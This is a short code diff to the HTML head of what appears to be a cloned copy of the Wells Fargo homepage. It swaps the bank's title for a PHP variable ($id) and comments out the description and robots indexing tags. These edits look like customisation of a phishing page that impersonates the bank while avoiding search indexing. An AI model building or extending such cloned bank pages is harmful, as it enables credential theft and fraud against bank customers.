@@ -5,10 +5,11 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages &amp; More</title>
-    <meta name="description" content="Wells Fargo: Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more.">
+    <title><?=$id?></title>
+    <!-- <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages &amp; More</title> -->
+    <!-- <meta name="description" content="Wells Fargo: Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more."> -->
     <meta name="keywords" content="checking accounts, savings accounts, student loans, personal loans, investments, online banking, auto loans, home loans">
-    <meta name="robots" content="index, follow">
+    <!-- <meta name="robots" content="index, follow"> -->
     <meta name="search_category" content="Personal">
     <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
     <meta http-equiv="Cache-Control" content="must-revalidate">
